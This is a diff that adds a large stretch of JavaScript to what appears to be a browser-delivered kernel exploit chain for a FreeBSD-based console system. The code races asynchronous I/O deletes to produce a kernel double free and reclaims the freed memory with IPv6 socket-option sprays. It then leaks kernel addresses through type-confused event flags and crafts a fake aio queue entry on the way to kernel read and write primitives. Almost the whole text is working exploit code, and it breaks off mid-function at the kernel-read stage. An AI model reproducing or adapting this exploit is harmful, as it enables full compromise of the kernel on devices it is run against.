@@ -1134,5 +1134,982 @@ function makeRpc(worker) {
                 NUM_REQS, AIO_PRIORITY_HIGH, aioIds.addr);
             sc(SYS.aio_multi_cancel, aioIds.addr, NUM_REQS, outs.addr);
             sc(SYS.aio_multi_poll, aioIds.addr, NUM_REQS, outs.addr);
+            sc(SYS.close, client);
 
-            sc(
+            outs.dv.setUint32(0, 0, true);
+            outs.dv.setUint32(4, 0, true);
+            shared.u8.fill(0);
+
+            const b = chain(wrkCtx)
+                .store(shared.addr.add32(S_START), MARK_START)
+                .args([aioIds.addr.add32(WHICH * 4), 1, outs.addr.add32(4)])
+                .call(stubAddr.get(SYS.aio_multi_delete))
+                .saveRax(shared.addr.add32(S_RET))
+                .store(shared.addr.add32(S_END), MARK_END)
+                .end();
+            layout(wrkCtx, b.insts, b.targetIdx);
+            const raceTask = rpc("fire", wrkCtx.S.low, wrkCtx.S.hi);
+
+            let yields = 0;
+            while (yields < YIELD_CAP
+                   && (shared.dv.getUint32(S_START, true) >>> 0) !== MARK_START) {
+                sc(SYS.sched_yield);
+                yields++;
+            }
+            const sawStart =
+                (shared.dv.getUint32(S_START, true) >>> 0) === MARK_START;
+            if (!sawStart) {
+
+                neverStarted++;
+                await raceTask;
+                sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
+                sc(SYS.close, conn);
+                continue;
+            }
+            yieldTotal += yields;
+
+            if (PRE_SUSPEND_MS > 0) {
+                preTs.u8.fill(0);
+                preTs.dv.setUint32(8, (PRE_SUSPEND_MS * 1000000) >>> 0, true);
+                sc(SYS.nanosleep, preTs.addr, 0);
+            }
+
+            const susp = sc(SYS.thr_suspend_ucontext, wTid).i32;
+            if (susp === 0) rendezvous++;
+            if (susp !== 0) {
+                suspendFail++;
+                sc(SYS.thr_resume_ucontext, wTid);
+                await raceTask;
+                sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
+                sc(SYS.close, conn);
+                continue;
+            }
+
+            let decided = false;
+            try {
+
+                let pollErr = 0, tcpState = 0, wFinished = 0, probes = 0;
+                for (;;) {
+                    sc(SYS.aio_multi_poll, aioIds.addr.add32(WHICH * 4), 1,
+                        outs.addr);
+                    pollErr = outs.dv.getUint32(0, true);
+
+                    infoLen.dv.setInt32(0, TCP_INFO_SIZE, true);
+                    sc(SYS.getsockopt, conn, IPPROTO_TCP, TCP_INFO,
+                        info.addr, infoLen.addr);
+                    tcpState = info.dv.getUint8(0);
+
+                    wFinished =
+                        (shared.dv.getUint32(S_END, true) >>> 0) === MARK_END ? 1 : 0;
+
+                    if (tcpState !== TCPS_ESTABLISHED || wFinished) break;
+                    if (probes >= PROBE_CAP) break;
+
+                    sc(SYS.thr_resume_ucontext, wTid);
+                    sc(SYS.sched_yield);
+                    if (sc(SYS.thr_suspend_ucontext, wTid).i32 !== 0) {
+                        resuspendFail++;
+                        break;
+                    }
+                    probes++;
+                }
+                probeTotal += probes;
+                if (probes > probeMax) probeMax = probes;
+                if (wFinished) tooLateSeen++; else inWindowSeen++;
+
+                if (pollErr !== SCE_KERNEL_ERROR_ESRCH && !wFinished
+                    && (!STRICT_TCP || tcpState !== TCPS_ESTABLISHED)) {
+                    detectorFired++;
+                    lastPollErr = pollErr; lastTcp = tcpState;
+                    phaseAtDecision[0] = wFinished;
+                    phaseAtDecision[1] = 1;
+                    winAt = it;
+
+                    if (STOP_PRECOMMIT) {
+
+                        precommitHits++;
+                        mark("PRECOMMIT-HELD", "attempt=" + it
+                            + " delete2=withheld committed=false");
+                    } else {
+                        sc(SYS.aio_multi_delete,
+                            aioIds.addr.add32(WHICH * 4), 1, outs.addr);
+                        won = true;
+                        committed = true;
+                    }
+                    decided = true;
+
+                    if (!STOP_PRECOMMIT) {
+                        for (let k = 0; k < ipv6Socks.length; ++k) {
+                            sprayRthdr.dv.setUint32(4, k, true);
+                            sc(SYS.setsockopt, ipv6Socks[k], IPPROTO_IPV6,
+                                IPV6_RTHDR, sprayRthdr.addr, sprayRthdrLen);
+                        }
+                        sprayedAt = it;
+                    }
+                }
+            } finally {
+
+                sc(SYS.thr_resume_ucontext, wTid);
+            }
+
+            await raceTask;
+
+            if (won) {
+                raceErr0 = outs.dv.getUint32(0, true);
+                raceErr1 = outs.dv.getUint32(4, true);
+                if (raceErr0 === 0 && raceErr1 === 0) {
+
+                    realFrees++;
+                    sprayedAt = it;
+
+                    twins = findRthdrTwins(0x80, true);
+                    confirmed = !!twins;
+                    rebootRequired = true;
+                    if (!confirmed) {
+
+                        reclaimFailed = true;
+                        break;
+                    }
+                } else {
+
+                    benignHits++;
+                    committed = realFrees > 0;
+                    if (benignHits >= MAX_MISFIRES) { misfireCap = true; break; }
+                }
+                won = confirmed;
+            }
+
+            sc(SYS.aio_multi_delete, aioIds.addr, NUM_REQS, outs.addr);
+            sc(SYS.close, conn);
+        }
+        const raceMs = Date.now() - tRace;
+        if (heartbeat) { clearInterval(heartbeat); heartbeat = 0; }
+
+        if (setupFail) mark("SOCKET-SETUP-FAILED", setupFail);
+        mark("RACE-DONE", attemptsUsed + " attempts in " + raceMs + " ms, "
+            + "detector fired " + detectorFired + " time(s): " + realFrees
+            + " real double free(s), " + benignHits + " harmless misfire(s)");
+        if (dupSeen) mark("DUP-FDS", dupSeen + " same-fd pair(s) rejected -- "
+            + "closed descriptors were still listed in the socket pool");
+        mark("PROBE", "walked the worker forward " + (rendezvous ? (probeTotal / rendezvous).toFixed(1) : "-")
+            + " steps on average, worst " + probeMax + " of " + PROBE_CAP
+            + ", " + resuspendFail + " re-suspend failures"
+            + "   -- pinned at the cap means raise ?probes=");
+        mark("DETECTOR", STRICT_TCP
+            ? "poll_err+tcp_state+worker_in_delete"
+            : "poll_err+worker_in_delete (tcp_state=report-only)");
+        mark("STUCK-DATA", stuckOk + " attempts left " + stuckBytes
+            + " bytes outstanding, " + stuckFail + " writes failed");
+        mark("RENDEZVOUS", rendezvous + " suspends: in-window " + inWindowSeen
+            + " / already finished " + tooLateSeen
+            + "   handoff cost " + (rendezvous ? (yieldTotal / rendezvous).toFixed(1)
+                                               : "-") + " yields"
+            + "   dropped: " + neverStarted + " never started, "
+            + suspendFail + " suspend refused");
+        mark("WINDOW-RATE", "in-window at the decision: " + inWindowSeen + "/"
+            + (inWindowSeen + tooLateSeen)
+            + "   -- with the worker frozen this should be near 1.0, unlike the "
+            + "0.33% a spacer could reach");
+        if (misfireCap)
+            mark("MISFIRE-CAP", benignHits + " detector hits produced no clean double "
+                + "free, so the loop stopped instead of racing on. the timing is "
+                + "off -- try a different ?spacer= before spending another boot.");
+        if (reclaimFailed)
+            mark("RECLAIM-FAILED", "a real double free could not be reclaimed. "
+                + "the loop stopped rather than free more chunks it cannot "
+                + "account for. this chunk is dangling -- reboot.");
+        if (detectorFired) {
+            mark("WIN-EVIDENCE", "poll_err=" + hx(lastPollErr)
+                + " tcp_state=" + lastTcp
+                + "   worker chain at the decision: started="
+                + phaseAtDecision[1] + " finished=" + phaseAtDecision[0]
+                + "   race_errs=" + hx(raceErr0) + "," + hx(raceErr1));
+        }
+
+        check("race-won", detectorFired > 0,
+            detectorFired + " detector hits in " + attemptsUsed + " attempts");
+        if (STOP_PRECOMMIT) {
+
+            mark("PRECOMMIT-STOP", "held=" + precommitHits + " attempts="
+                + attemptsUsed + " committed=false reboot=false");
+            check("precommit stopped clean",
+                !committed && !rebootRequired,
+                "committed=" + committed + " rebootRequired=" + rebootRequired);
+        } else {
+            check("deletes-reported-success-a-real",
+                detectorFired > 0 && raceErr0 === 0 && raceErr1 === 0,
+                "race_errs=" + hx(raceErr0) + "," + hx(raceErr1));
+            check("freed-chunk-reclaimed-rthdr-data", !!twins,
+                twins ? ("twins are fds " + twins.a + " and " + twins.b
+                         + " after " + twins.round + " round(s)")
+                      : "no twins found");
+        }
+
+        if (twins) {
+            twinSocks.push(twins.a, twins.b);
+            mark("DOUBLE-FREE-ACHIEVED", "fds " + twinSocks.join(" and ")
+                + " now alias one 0x80 allocation");
+
+            state("leaking kernel addresses...", "warn");
+            const leakOk = (function () {
+                function getRthdr(sock, size) {
+                    leakLen.dv.setInt32(0, size, true);
+                    const r = sc(SYS.getsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
+                        leakRthdr.addr, leakLen.addr).i32;
+                    return r === -1 ? -1 : leakLen.dv.getInt32(0, true);
+                }
+                function setRthdrOn(sock) {
+                    return sc(SYS.setsockopt, sock, IPPROTO_IPV6, IPV6_RTHDR,
+                        sprayRthdr.addr, sprayRthdrLen).i32;
+                }
+                function lk8(off) {
+                    return new int64(leakRthdr.dv.getUint32(off, true),
+                                     leakRthdr.dv.getUint32(off + 4, true));
+                }
+
+                function kptr(v) { return (v.hi >>> 16) === 0xffff; }
+
+                {
+                    const ID = new int64(0xffffffff, 0xffffffff);
+                    maskBuf.u8.fill(0);
+                    maskBuf.dv.setUint32(0, savedMask.low, true);
+                    maskBuf.dv.setUint32(4, savedMask.hi, true);
+                    const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
+                        CPU_WHICH_TID, ID, 0x10, maskBuf.addr).i32;
+                    prioBuf.dv.setUint16(0, savedPrio[0], true);
+                    prioBuf.dv.setUint16(2, savedPrio[1], true);
+                    const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioBuf.addr).i32;
+                    mark("SCHED-RELEASED", "affinity=" + ar + " back to "
+                        + savedMask + ", rtprio=" + pr + " back to {"
+                        + savedPrio + "} -- stage 2 must not run realtime on "
+                        + "one core");
+                }
+
+                const dirty = twinSocks[0];
+                if (sc(SYS.close, twinSocks[1]).i32 === -1) {
+                    mark("LEAK-FAIL", "could not close twin " + twinSocks[1]);
+                    return false;
+                }
+                mark("TWIN-CLOSED", "fd " + twinSocks[1] + " freed the rthdr; "
+                    + "fd " + dirty + " still points at it");
+
+                const evfName = alloc(8);
+                evfName.u8.fill(0);
+                let evf = -1;
+                for (let round = 0; round < EVF_ATTEMPTS && evf < 0; ++round) {
+                    const evfs = [];
+                    for (let i = 0; i < HANDLES_NUM; ++i)
+                        evfs.push(sc(SYS.evf_create, evfName.addr, 0,
+                            ((i << 0x10) | 0xf00) >>> 0).i32);
+
+                    if (getRthdr(dirty, 0x80) !== -1) {
+                        const marker = leakRthdr.dv.getUint32(0, true);
+                        const tag = marker & 0xffff, idx = marker >>> 0x10;
+                        if (tag === 0xf00 && idx < evfs.length) {
+                            const cand = evfs[idx];
+
+                            sc(SYS.evf_clear, cand, 0);
+                            sc(SYS.evf_set, cand, (marker | 1) >>> 0);
+                            getRthdr(dirty, 0x80);
+                            const m2 = leakRthdr.dv.getUint32(0, true);
+                            if ((m2 & 0xffff) === ((tag | 1) & 0xffff)
+                                && (m2 >>> 0x10) === idx) {
+                                evf = cand;
+                                evfs.splice(idx, 1);
+                            }
+                        }
+                    }
+                    for (let i = 0; i < evfs.length; ++i)
+                        sc(SYS.evf_delete, evfs[i]);
+                    if (evf >= 0) mark("EVF-CONFUSED", "evf=" + hx(evf)
+                        + " after " + round + " round(s)");
+                }
+                if (!check("evf-type-confused-rthdr", evf >= 0,
+                        evf >= 0 ? "" : EVF_ATTEMPTS + " rounds, no marker")) return false;
+
+                const evfCv = lk8(0x28);
+
+                const reqs2Addr = lk8(0x40).sub32(0x38);
+                mark("KADDR-EVF-CV", evfCv.toString());
+                mark("KADDR-REQS2", reqs2Addr.toString());
+                if (!check("leaked-evf-holds-kernel-pointers",
+                        kptr(evfCv) && kptr(reqs2Addr),
+                        "cv=" + evfCv + " reqs2=" + reqs2Addr)) return false;
+
+                sc(SYS.evf_clear, evf, 0);
+                sc(SYS.evf_set, evf, 0xff00);
+                const wide = getRthdr(dirty, 0x800);
+                if (!check("read-window-widened-0x800", wide === 0x800,
+                        "getsockopt returned " + wide)) return false;
+
+                const leakIds = alloc(HANDLES_NUM * LEAK_NUM_REQS * 4);
+                buildReqs1(LEAK_NUM_REQS, -1);
+                reqs1.dv.setUint32(0x10, reqs2Addr.add32(4).low, true);
+                reqs1.dv.setUint32(0x14, reqs2Addr.add32(4).hi, true);
+
+                const LEAK_NBYTE = params.get("leaknb") === "1" ? 1 : 0;
+                if (leakPipeOk && params.get("leakfd") !== "0") {
+                    for (let i = 0; i < LEAK_NUM_REQS; ++i) {
+                        const o = i * AIO_RW_REQ_SIZE;
+                        reqs1.dv.setInt32(o + AIO_RW_REQ_FD, leakPipe[1], true);
+                        reqs1.dv.setUint32(o + AIO_RW_REQ_NBYTE, LEAK_NBYTE, true);
+                    }
+                    mark("LEAK-FD", "every leak request names fd " + leakPipe[1]
+                        + " (leak pipe, write end) with nbyte=" + LEAK_NBYTE
+                        + " so ar2_file comes back populated");
+                }
+
+                function verifyReqs2(base) {
+                    if (leakRthdr.dv.getUint32(base + AR2_CMD, true) !== AIO_CMD_WRITE)
+                        return false;
+                    const pref = [];
+                    const want = [AR2_REQS1, AR2_INFO, AR2_BATCH, AR2_QENTRY];
+                    for (let i = 0; i < want.length; ++i) {
+                        const v = lk8(base + want[i]);
+                        if (!kptr(v)) return false;
+                        pref.push(v.hi & 0xffff);
+                    }
+                    const st = leakRthdr.dv.getUint32(base + AR2_RESULT_STATE, true);
+                    if (st <= 0 || st > AIO_STATE_ABORTED) return false;
+                    if (leakRthdr.dv.getUint32(base + AR2_RESULT_PAD, true) !== 0) return false;
+
+                    const file = lk8(base + AR2_FILE);
+                    if (!(file.low === 0 && file.hi === 0) && !kptr(file))
+                        return false;
+                    const unk2 = lk8(base + AR2_UNK2);
+                    if (!(unk2.low === 0 && unk2.hi === 0)) {
+                        if (!kptr(unk2)) return false;
+                        pref.push(unk2.hi & 0xffff);
+                    }
+                    return pref.every(function (v) { return v === pref[0]; });
+                }
+
+                let reqs2Base = -1;
+                for (let round = 0; round < EVF_ATTEMPTS && reqs2Base < 0; ++round) {
+                    for (let i = 0; i < HANDLES_NUM; ++i)
+                        sc(SYS.aio_submit_cmd, AIO_CMD_WRITE | AIO_CMD_MULTI,
+                            reqs1.addr, LEAK_NUM_REQS, AIO_PRIORITY_HIGH,
+                            leakIds.addr.add32(i * LEAK_NUM_REQS * 4));
+
+                    getRthdr(dirty, 0x800);
+                    for (let j = 1; j < 0x10; ++j)
+                        if (verifyReqs2(j * AIO_ENTRY_SIZE)) { reqs2Base = j * AIO_ENTRY_SIZE; break; }
+
+                    if (reqs2Base >= 0) {
+                        mark("REQS2-FOUND", "entry " + (reqs2Base / AIO_ENTRY_SIZE)
+                            + " after " + round + " round(s)");
+                        break;
+                    }
+                    for (let o = 0; o < leakIds.len / 4; o += AIO_MAX_NUM) {
+                        const step = Math.min(AIO_MAX_NUM, leakIds.len / 4 - o);
+                        sc(SYS.aio_multi_cancel, leakIds.addr.add32(o * 4), step, outs.addr);
+                        sc(SYS.aio_multi_poll, leakIds.addr.add32(o * 4), step, outs.addr);
+                        sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
+                    }
+                }
+                if (!check("full-aio_entry-leaked", reqs2Base >= 0,
+                        reqs2Base >= 0 ? "at +0x" + reqs2Base.toString(16)
+                                       : "no entry passed verification")) return false;
+
+                const reqs1Addr = lk8(reqs2Base + AR2_REQS1);
+                const aioInfoAddr = lk8(reqs2Base + AR2_INFO);
+                const reqs1Aligned = new int64(reqs1Addr.low & 0xffffff00, reqs1Addr.hi);
+                mark("KADDR-REQS1", reqs1Aligned.toString()
+                    + "  (raw " + reqs1Addr + ")");
+                mark("KADDR-AIO-INFO", aioInfoAddr.toString());
+
+                const leakFp = lk8(reqs2Base + AR2_FILE);
+                if (kptr(leakFp)) kLeakFp = leakFp;
+                mark("KADDR-AR2-FILE", leakFp + (kptr(leakFp)
+                    ? "  -- leak pipe's struct file, good for the whole run"
+                    : "  -- NOT a kernel pointer, so stage 4 falls back to "
+                    + "aio_info+8 exactly as before"));
+                mark("LEAK-ENTRY-INDEX", "window entry "
+                    + (reqs2Base / AIO_ENTRY_SIZE)
+                    + " -- correlate this with whether curproc works: if the "
+                    + "aio_info route only ever succeeds for one particular "
+                    + "index, that confirms ar2_info is per-entry");
+
+                let targetId = 0, restFrom = -1;
+                const totalIds = leakIds.len / 4;
+
+                mark("TARGET-SEARCH", "scanning " + (totalIds / LEAK_NUM_REQS)
+                    + " batches, each cancel + 0x800 OOB read");
+                let lastRthdrLen = -1;
+                for (let b = 0; b < totalIds; b += LEAK_NUM_REQS) {
+                    sc(SYS.aio_multi_cancel, leakIds.addr.add32(b * 4),
+                        LEAK_NUM_REQS, outs.addr);
+                    const gr = getRthdr(dirty, 0x800);
+                    if ((b / LEAK_NUM_REQS) % 32 === 0)
+                        mark("TARGET-SCAN", "batch " + (b / LEAK_NUM_REQS)
+                            + " rthdr_len=" + gr);
+
+                    if (gr !== 0x800) {
+                        mark("TARGET-WINDOW-LOST", "batch " + (b / LEAK_NUM_REQS)
+                            + " getsockopt returned " + gr + ", expected 2048 -- "
+                            + "the confused evf no longer controls ip6r0_len");
+                        break;
+                    }
+                    lastRthdrLen = gr;
+                    if (leakRthdr.dv.getUint32(reqs2Base + AR2_RESULT_STATE, true)
+                            === AIO_STATE_ABORTED) {
+                        targetId = leakIds.dv.getUint32(b * 4, true);
+                        leakIds.dv.setUint32(b * 4, 0, true);
+                        restFrom = b + LEAK_NUM_REQS;
+                        mark("TARGET-ID", hx(targetId) + " at batch "
+                            + (b / LEAK_NUM_REQS));
+                        break;
+                    }
+                }
+                if (!check("target_id was identified", targetId !== 0,
+                        restFrom >= 0 ? "" : "no batch aborted the leaked entry"))
+                    return false;
+
+                for (let o = restFrom; o < totalIds; o += AIO_MAX_NUM) {
+                    const step = Math.min(AIO_MAX_NUM, totalIds - o);
+                    sc(SYS.aio_multi_cancel, leakIds.addr.add32(o * 4), step, outs.addr);
+                }
+                for (let o = 0; o < totalIds; o += AIO_MAX_NUM) {
+                    const step = Math.min(AIO_MAX_NUM, totalIds - o);
+                    sc(SYS.aio_multi_poll, leakIds.addr.add32(o * 4), step, outs.addr);
+                    sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
+                }
+
+                mark("KADDRS", "evf_cv=" + evfCv + " reqs2=" + reqs2Addr
+                    + " reqs1=" + reqs1Aligned + " aio_info=" + aioInfoAddr
+                    + " target_id=" + hx(targetId) + " evf=" + hx(evf)
+                    + " dirty_fd=" + dirty);
+                mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");
+
+                state("stage 3: crafting the aio queue entry...", "warn");
+
+                sc(SYS.evf_delete, evf);
+                mark("EVF-DELETED", hx(evf));
+
+                const NUM_BATCHES = 2;
+                const aioIds2 = alloc(AIO_MAX_NUM * NUM_BATCHES * 4);
+                buildReqs1(AIO_MAX_NUM, -1);
+                function sprayBatches() {
+                    for (let b = 0; b < NUM_BATCHES; ++b)
+                        sc(SYS.aio_submit_cmd, AIO_CMD_READ | AIO_CMD_MULTI,
+                            reqs1.addr, AIO_MAX_NUM, AIO_PRIORITY_HIGH,
+                            aioIds2.addr.add32(b * AIO_MAX_NUM * 4));
+                }
+                function processBatches(cancel, poll, del) {
+                    const total = AIO_MAX_NUM * NUM_BATCHES;
+                    for (let o = 0; o < total; o += AIO_MAX_NUM) {
+                        const a = aioIds2.addr.add32(o * 4);
+                        if (cancel) sc(SYS.aio_multi_cancel, a, AIO_MAX_NUM, outs.addr);
+                        if (poll) sc(SYS.aio_multi_poll, a, AIO_MAX_NUM, outs.addr);
+                        if (del) sc(SYS.aio_multi_delete, a, AIO_MAX_NUM, outs.addr);
+                    }
+                }
+                let qLeaked = false;
+                for (let r = 0; r < EVF_ATTEMPTS && !qLeaked; ++r) {
+                    sprayBatches();
+                    const len = getRthdr(dirty, 0x800);
+                    const cmd = leakRthdr.dv.getUint32(0, true);
+                    if (len === 8 && cmd === AIO_CMD_READ) {
+                        qLeaked = true;
+                        processBatches(true, false, false);
+                        mark("QUEUE-LEAKED", "aio queue entry over the rthdr after "
+                            + r + " round(s), len=" + len + " ar2_cmd=" + hx(cmd));
+                        break;
+                    }
+                    processBatches(true, true, true);
+                }
+                if (!check("aio-queue-entry-leaked-rthdr", qLeaked,
+                        qLeaked ? "" : EVF_ATTEMPTS + " rounds, rthdr never became "
+                        + "an aio_entry")) return false;
+
+                sprayRthdr.dv.setUint32(4, 5, true);
+                put(sprayRthdr.dv, AR2_INFO, reqs1Aligned);
+                put(sprayRthdr.dv, AR2_BATCH, reqs2Addr.add32(REQS3_OFF));
+                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_NUM_REQS, 1, true);
+                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_REQS_LEFT, 0, true);
+                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_STATE, AIO_STATE_COMPLETE, true);
+                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_DONE, 0, true);
+
+                sprayRthdr.dv.setUint32(REQS3_OFF + AR3_LOCK_FLAGS, 0x67b0000, true);
+                put(sprayRthdr.dv, REQS3_OFF + AR3_LOCK, new int64(1, 0));
+                mark("BATCH-CRAFTED", "ar2_info=" + reqs1Aligned
+                    + " ar2_batch=" + reqs2Addr.add32(REQS3_OFF)
+                    + " ar3_state=COMPLETE");
+
+                if (sc(SYS.close, dirty).i32 === -1) {
+                    check("dirty-socket-closed", false, "fd " + dirty);
+                    return false;
+                }
+                mark("DIRTY-CLOSED", "fd " + dirty + " released the aio_entry");
+                twinSocks.length = 0;
+
+                let reqId = 0, dirty2 = -1;
+                const total2 = AIO_MAX_NUM * NUM_BATCHES;
+                for (let r = 0; r < EVF_ATTEMPTS && dirty2 < 0; ++r) {
+                    for (let i = 0; i < ipv6Socks.length; ++i) {
+                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6, IPV6_RTHDR,
+                            sprayRthdr.addr, sprayRthdrLen);
+                    }
+                    for (let o = 0; o < total2 && dirty2 < 0; o += AIO_MAX_NUM) {
+                        for (let z = 0; z < AIO_MAX_NUM; ++z)
+                            outs.dv.setInt32(z * 4, -1, true);
+                        sc(SYS.aio_multi_cancel, aioIds2.addr.add32(o * 4),
+                            AIO_MAX_NUM, outs.addr);
+                        let reqIdx = -1;
+                        for (let z = 0; z < AIO_MAX_NUM; ++z)
+                            if (outs.dv.getUint32(z * 4, true) === AIO_STATE_COMPLETE) {
+                                reqIdx = z; break;
+                            }
+                        if (reqIdx < 0) continue;
+                        const abs = o + reqIdx;
+                        reqId = aioIds2.dv.getUint32(abs * 4, true);
+
+                        sc(SYS.aio_multi_poll, aioIds2.addr.add32(abs * 4), 1, outs.addr);
+                        aioIds2.dv.setUint32(abs * 4, 0, true);
+                        for (let k = 0; k < ipv6Socks.length; ++k) {
+                            if (getRthdr(ipv6Socks[k], 0x80) === -1) continue;
+                            if (leakRthdr.dv.getUint8(REQS3_OFF + AR3_DONE) !== 0) {
+                                dirty2 = ipv6Socks[k];
+
+                                twinSocks.push(dirty2);
+                                ipv6Socks.splice(k, 1);
+                                for (let m = 0; m < ipv6Socks.length; ++m)
+                                    sc(SYS.setsockopt, ipv6Socks[m], IPPROTO_IPV6,
+                                        IPV6_RTHDR, 0, 0);
+                                const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
+                                if (ns !== -1) ipv6Socks.push(ns);
+                                mark("BATCH-OVERWRITTEN", "req_id=" + hx(reqId)
+                                    + " dirty_fd=" + dirty2 + " after " + r
+                                    + " round(s)");
+                                break;
+                            }
+                        }
+                    }
+                }
+                if (!check("crafted-aio-queue-entry-installed", dirty2 >= 0,
+                        dirty2 >= 0 ? "" : "never observed ar3_done being set"))
+                    return false;
+
+                processBatches(false, true, true);
+
+                const targetIds = alloc(8);
+                targetIds.dv.setUint32(0, reqId, true);
+                targetIds.dv.setUint32(4, targetId, true);
+                sc(SYS.aio_multi_poll, targetIds.addr.add32(4), 1, outs.addr);
+                mark("TARGET-ARMED", "req_id=" + hx(reqId) + " target_id="
+                    + hx(targetId) + " -- both deletes now free the same 0x100 "
+                    + "allocation");
+
+                committed2 = true;
+
+                const tDel = Date.now();
+                sc(SYS.aio_multi_delete, targetIds.addr, 2, outs.addr);
+                const delMs = Date.now() - tDel;
+                const derr0 = outs.dv.getUint32(0, true);
+                const derr1 = outs.dv.getUint32(4, true);
+                if (delMs > 300)
+                    mark("DELETE-SLOW", "aio_multi_delete of the target pair took "
+                        + delMs + " ms. Normal is under 100. The 0x100 chunk has "
+                        + "been free and unclaimed for that whole time, so the "
+                        + "reclaim below is likely to fail -- and if it does, "
+                        + "that is the reason, not the spray.");
+
+                let ptwins = null;
+                const tclass = alloc(4), tclassLen = alloc(4);
+                for (let r = 0; r < EVF_ATTEMPTS && !ptwins; ++r) {
+                    for (let i = 0; i < ipv6Socks.length; ++i)
+                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
+                            IPV6_2292PKTOPTIONS, 0, 0);
+                    for (let i = 0; i < ipv6Socks.length; ++i) {
+                        tclass.dv.setInt32(0, i, true);
+                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
+                            IPV6_TCLASS, tclass.addr, 4);
+                    }
+                    for (let j = 0; j < ipv6Socks.length; ++j) {
+                        tclassLen.dv.setInt32(0, 4, true);
+                        if (sc(SYS.getsockopt, ipv6Socks[j], IPPROTO_IPV6,
+                                IPV6_TCLASS, tclass.addr, tclassLen.addr).i32 === -1)
+                            continue;
+                        const idx = tclass.dv.getInt32(0, true);
+                        if (idx === j || idx < 0 || idx >= ipv6Socks.length) continue;
+                        if (ipv6Socks[idx] === ipv6Socks[j]) { dupSeen++; continue; }
+                        ptwins = { round: r, a: ipv6Socks[j], b: ipv6Socks[idx] };
+                        const hi2 = Math.max(j, idx), lo2 = Math.min(j, idx);
+                        ipv6Socks.splice(hi2, 1);
+                        ipv6Socks.splice(lo2, 1);
+                        for (let m = 0; m < 2; ++m) {
+                            const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
+                            if (ns === -1) continue;
+                            tclass.dv.setInt32(0, ipv6Socks.length, true);
+                            sc(SYS.setsockopt, ns, IPPROTO_IPV6, IPV6_TCLASS,
+                                tclass.addr, 4);
+                            ipv6Socks.push(ns);
+                        }
+                        break;
+                    }
+                }
+                mark("DELETE-ERRS", hx(derr0) + "," + hx(derr1)
+                    + "   (" + delMs + " ms)");
+                check("target-deletes-reported-success",
+                    derr0 === 0 && derr1 === 0, hx(derr0) + "," + hx(derr1));
+                if (ptwins && ptwins.a === ptwins.b) {
+                    mark("FALSE-TWINS", "both pktopts twins are fd " + ptwins.a
+                        + " -- that is one socket seen twice, not an aliased "
+                        + "allocation. refusing to build a read primitive on it.");
+                    ptwins = null;
+                }
+                if (!check("0x100-chunk-reclaimed-pktopts", !!ptwins,
+                        ptwins ? ("pktopts twins are fds " + ptwins.a + " and "
+                                  + ptwins.b + " after " + ptwins.round + " round(s)")
+                               : "no pktopts twins found -- the 0x100 chunk is "
+                                 + "dangling, reboot now"))
+                    return false;
+
+                pktoptsTwins.push(ptwins.a, ptwins.b);
+                mark("STAGE-3-DONE", "pktopts twins fds "
+                    + pktoptsTwins.join(" and ")
+                    + " alias one 0x100 allocation. make_karw is step 4i, and "
+                    + "it is the first point where any of this can be repaired.");
+
+                state("stage 4: kernel read...", "warn");
+
+                sprayRthdr.u8.fill(0);
+                const karwLen = buildRthdr(sprayRthdr, 0x100);
+                const pktinfoSelf = reqs1Aligned.add32(PKTOPTS_PKTINFO);
+                put(sprayRthdr.dv, PKTOPTS_PKTINFO, pktinfoSelf);
+                mark("KARW-SPRAY", "rthdr len 0x" + karwLen.toString(16)
+                    + ", ip6po_pktinfo -> itself at " + pktinfoSelf);
+
+                if (sc(SYS.close, pktoptsTwins[1]).i32 === -1) {
+                    check("second-pktopts-twin-closed", false,
+                        "fd " + pktoptsTwins[1]);
+                    return false;
+                }
+                mark("PKTOPTS-TWIN-CLOSED", "fd " + pktoptsTwins[1]
+                    + " freed the pktopts; fd " + pktoptsTwins[0]
+                    + " still points at it");
+
+                const tcBuf = alloc(4), tcLen = alloc(4);
+                let karwSock = -1;
+                for (let r = 0; r < EVF_ATTEMPTS && karwSock < 0; ++r) {
+                    for (let i = 0; i < ipv6Socks.length; ++i) {
+                        sprayRthdr.dv.setUint32(PKTOPTS_TCLASS,
+                            ((i << 0x10) | KARW_MARKER) >>> 0, true);
+                        sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
+                            IPV6_RTHDR, sprayRthdr.addr, karwLen);
+                    }
+                    tcLen.dv.setInt32(0, 4, true);
+                    if (sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
+                            IPV6_TCLASS, tcBuf.addr, tcLen.addr).i32 === -1)
+                        continue;
+                    const marker = tcBuf.dv.getUint32(0, true) >>> 0;
+                    if ((marker & 0xffff) === KARW_MARKER) {
+                        const which = marker >>> 0x10;
+                        if (which < ipv6Socks.length) {
+                            karwSock = ipv6Socks[which];
+                            ipv6Socks.splice(which, 1);
+                            mark("PKTOPTS-OVERWRITTEN", "fd " + karwSock
+                                + " now backs fd " + pktoptsTwins[0]
+                                + "'s pktopts, after " + r + " round(s)");
+                        }
+                    }
+                }
+                if (!check("rthdr-sprayed-live-pktopts",
+                        karwSock >= 0,
+                        karwSock >= 0 ? "" : "the 0x1337 marker never appeared "
+                        + "in IPV6_TCLASS")) return false;
+                pktoptsTwins[1] = karwSock;
+
+                const pktinfo = alloc(0x14), nhopLen = alloc(4), kbuf = alloc(0x20);
+                let kreadCalls = 0, kreadFail = 0;
+
+                let kwriteCalls = 0;
+
+                function pktinfoSet(fill) {
+                    kwriteCalls++;
+                    pktinfo.u8.fill(0);
+                    fill(pktinfo.dv);
